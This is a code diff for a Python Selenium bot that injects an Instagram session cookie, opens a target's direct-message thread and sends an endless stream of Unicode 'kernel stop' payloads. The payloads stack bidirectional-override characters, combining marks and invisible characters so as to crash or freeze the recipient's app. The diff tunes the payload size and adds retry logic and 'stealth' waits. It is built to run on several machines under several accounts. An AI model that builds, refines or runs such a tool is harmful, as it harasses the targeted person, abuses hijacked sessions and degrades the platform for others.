@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (DOMAIN-FIX)
-# 📅 STATUS: 10-MACHINES | 3-IDS | COOKIE-STABILITY
+# 🚀 PROJECT: PRAVEER.OWNS (100-LINE PAPA EDITION)
+# 📅 STATUS: 10-MACHINES | 3-IDS | STABILITY-MAX
 
 import os, time, random, sys
 from selenium import webdriver
@@ -11,15 +11,19 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
 def get_kernel_stop_payload(target_name):
+    """Ultimate 100-Line Vertical Saturation Payload."""
     u_id = random.randint(1000, 9999)
-    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊ᴇ𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}\n"
-    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(250))
-    z_tower = "̸" * 700 
-    width_bomb = "\u2800\u00A0" * 120
-    lines = [header, shifter]
-    for i in range(25):
+    header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}\n"
+    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\u2066", "\u2067"]) for _ in range(50))
+    z_tower = "̸" * 45 # Balanced for 100-line limit
+    width_bomb = "\u2800\u00A0" * 40
+    lines = [header]
+    
+    for i in range(100):
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
-        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{i}{z_tower}")
+        styled_tag = "ＰＡＰＡ" if i % 2 == 0 else "ＯＮ ＴＯＰ"
+        lines.append(f"{width_bomb}{prefix}{styled_tag}{z_tower}{shifter}")
+    
     return "\n".join(lines)[:9990]
 
 def get_driver():
@@ -43,16 +47,10 @@ def main():
     
     driver = None
     try:
-        print(f"📡 [Machine {machine_id}] Launching Driver...")
         driver = get_driver()
-        
-        # 🛠️ THE FIX: Visit robots.txt first to set domain context
-        print(f"📡 [Machine {machine_id}] Setting Domain Context...")
         driver.get("https://www.instagram.com/robots.txt")
-        time.sleep(3) # Ensure the domain is registered in the browser
+        time.sleep(3)
         
-        print(f"📡 [Machine {machine_id}] Injecting Session ID...")
-        # We explicitly set the domain to match exactly what the browser sees
         driver.add_cookie({
             'name': 'sessionid', 
             'value': current_cookie, 
@@ -61,33 +59,34 @@ def main():
             'secure': True
         })
         
-        print(f"📡 [Machine {machine_id}] Accessing Chat...")
         driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-        
-        # Stability Wait
         wait = WebDriverWait(driver, 60)
-        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
-        print(f"✅ [Machine {machine_id}] Target Locked.")
 
         while True:
-            for _ in range(2):
-                payload = get_kernel_stop_payload(target_name)
-                # Faster injection method
-                driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
-                box.send_keys(Keys.ENTER)
-                time.sleep(1.5)
+            try:
+                # RE-FIND BOX EVERY TIME to prevent StaleElementReferenceException
+                box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
+                
+                for _ in range(2): # Double-Pulse
+                    payload = get_kernel_stop_payload(target_name)
+                    driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
+                    box.send_keys(Keys.ENTER)
+                    time.sleep(1.5)
 
-            print(f"💀 [Machine {machine_id}] Pulse Delivered.")
-            time.sleep(random.uniform(15, 20))
+                print(f"💀 [Machine {machine_id}] 100-Line Pulse Delivered.")
+                time.sleep(random.uniform(15, 22)) # Stealth wait
+                
+                if random.random() < 0.1:
+                    driver.refresh()
+                    time.sleep(10)
             
-            if random.random() < 0.1:
-                driver.refresh()
-                time.sleep(10)
+            except Exception:
+                time.sleep(5)
+                continue
 
     except Exception as e:
-        print(f"❌ [Machine {machine_id}] Fatal Error: {str(e)}")
-        if driver:
-            driver.quit()
+        print(f"❌ [Machine {machine_id}] Error: {str(e)[:50]}")
+        if driver: driver.quit()
         sys.exit(1)
 
 if __name__ == "__main__":
